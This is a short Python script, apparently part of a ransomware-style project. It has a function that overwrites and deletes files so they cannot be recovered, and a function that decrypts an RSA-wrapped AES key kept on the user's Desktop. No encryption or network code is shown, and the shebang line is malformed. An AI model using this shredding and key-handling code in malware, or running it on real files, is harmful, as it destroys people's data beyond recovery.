#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
from Crypto.PublicKey import RSA
import os
import string
import random

def generate_data(length):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

# destroi o arquivo original e depois exclui, não podendo recupera-lo com buscas na memória
def shred(file_name,  passes):
    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)

# DESCRIPTOGRAFA A CHAVE AES, COM A CHAVE PRIVADA DO CLIENTE
def RSA_to_AES():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    file_enc = caminho_correto + 'AES.txt.enc'
    novo = caminho_correto + 'AES.txt'
    file_priv = caminho_correto + 'chave_privada_cliente.txt'
    f = open(file_priv,'rb')
    chave_privada = f.read()
    f.close()
    f = open(file_enc,'rb')
    dados = f.read()
    f.close()
    chave_privada_obj = RSA.importKey(chave_privada)
    dados_dec = chave_privada_obj.decrypt(dados)
    f = open(novo,'w')
    f.write(dados_dec)
    f.close()
    os.remove(file_enc)
